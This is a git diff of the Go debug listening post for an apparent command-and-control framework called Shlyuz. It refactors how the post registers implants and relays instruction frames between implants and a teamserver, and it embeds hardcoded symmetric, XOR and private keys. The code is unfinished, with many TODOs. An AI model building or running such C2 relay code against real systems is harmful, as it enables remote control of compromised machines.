@@ -1,3 +1,5 @@
+//go:build lp && (!implant || !teamserver)
+
 package main
 
 import (
@@ -6,11 +8,11 @@ import (
 	"time"
 
 	// "shlyuz/pkg/crypto/asymmetric"
-	"shlyuz/internal/debugLp/pkg/transport"
+	"shlyuz/pkg/transport"
 
-	"shlyuz/internal/debugLp/pkg/component"
-	"shlyuz/internal/debugLp/pkg/config"
-	"shlyuz/internal/debugLp/pkg/transaction"
+	"shlyuz/pkg/component"
+	"shlyuz/pkg/config/lpconfig"
+	"shlyuz/pkg/transaction"
 	"shlyuz/pkg/utils/idgen"
 	"shlyuz/pkg/utils/logging"
 	"shlyuz/pkg/utils/uname"
@@ -19,25 +21,23 @@ import (
 func makeManifest(componentId string) component.ComponentManifest {
 	var generatedManifest component.ComponentManifest
 	platInfo := uname.GetUname()
-	generatedManifest.Lp_hostname = platInfo.Uname.Nodename
-	generatedManifest.Lp_id = componentId
-	generatedManifest.Lp_os = platInfo.Uname.Sysname
+	generatedManifest.Hostname = platInfo.Uname.Nodename
+	generatedManifest.Id = componentId
+	generatedManifest.Os = platInfo.Uname.Sysname
 	return generatedManifest
 }
 
 func genComponentInfo(lpConfig []byte) component.Component {
 	var Component component.Component
-	parsedConfig := config.ParseConfig(lpConfig)
+	parsedConfig := lpconfig.ParseConfig(lpConfig)
 	log.SetPrefix(logging.GetLogPrefix())
 	log.Println("Started Shlyuz Debug LP")
 	Component.CurrentKeypair = parsedConfig.CryptoConfig.CompKeyPair
 	Component.InitalKeypair = Component.CurrentKeypair
 	Component.Config = parsedConfig
 	Component.ComponentId = Component.Config.Id
-	Component.XorKey = Component.Config.CryptoConfig.XorKey
 	Component.ConfigKey = Component.Config.CryptoConfig.SymKey
 	Component.Manifest = makeManifest(Component.ComponentId)
-	Component.CurrentImpPubkey = Component.Config.CryptoConfig.ImplantPk
 
 	return Component
 }
@@ -58,27 +58,40 @@ sym_key = BvjTA1o55UmZnuTy
 xor_key = 0x6d
 priv_key = jnbl37d67g656d617b19l6l02305g68l4d03ngn914800934511b2g13bgdg1021`)
 	Component := genComponentInfo(lpConfig)
+	// This is the start of the registration process for a client
+	// TODO: This is a loop per implant
+	var client transport.RegisteredComponent
+	var err error
 	transportWg := sync.WaitGroup{}
 	defer transportWg.Wait()
-	transport, _, err := transport.PrepareTransport(&Component, []string{})
+	client.Transport, _, err = transport.PrepareTransport(&Component, []string{})
 	if err != nil {
 		log.Fatalln("transport failed to initalize: ", err)
 	}
-	// TODO: This is a loop per implant
-	Component.CmdChannel = make(chan []byte)
-	initAckInstruction, client, boolSuccess := transaction.RetrieveInitFrame(&Component, transport)
+
+	client.InitalKeyPair = Component.InitalKeypair
+	client.InitalPubKey = Component.Config.CryptoConfig.PeerPk // find a better way to do this
+	client.CurKeyPair = client.InitalKeyPair
+	client.CurPubKey = client.InitalPubKey
+	client.XorKey = Component.Config.CryptoConfig.XorKey
+	client.TskChkTimer = Component.Config.TskChkTimer
+	client.InitSignature = Component.Config.InitSignature
+	client.SelfComponentId = Component.ComponentId
+
+	// This client is now considered registe
+	initAckInstruction, client, boolSuccess := transaction.RetrieveInitFrame(&client)
 	if !boolSuccess {
 		log.Println("implant failed to initalize")
 		// TODO: Restart loop here
 	}
-	transaction.RelayInitFrame(&Component, initAckInstruction, transport)
-	// TODO: Register the client here
+	transaction.RelayInitFrame(&client, initAckInstruction)
+	// TODO: Client is now considered registerd
 	log.Println(client)
 
 	// TODO: Implement loop here to do the actual stuff
 	//  as an LP, we are awaiting a request for a command from an implant, which is then relayed to TS, where we get a command etc
 	for {
-		instructionRequestFrame, err := transaction.RetrieveInstructionRequest(&Component, &client)
+		instructionRequestFrame, err := transaction.RetrieveInstructionRequest(&client) // Depending if we have something in the Queue for this implant, we'll relay an instruction
 		if err != nil {
 			log.Println("invalid instruction received: ")
 			log.Println("[dbginstructframe]: ", instructionRequestFrame)
@@ -86,7 +99,9 @@ priv_key = jnbl37d67g656d617b19l6l02305g68l4d03ngn914800934511b2g13bgdg1021`)
 			time.Sleep(time.Duration(Component.Config.TskChkTimer))
 			break
 		}
+		// TODO: Teamserver interaction function
 		// serverCmd := transaction.RelayInstructionToServer
-
+		time.Sleep(time.Duration(Component.Config.TskChkTimer))
+		break
 	}
 }
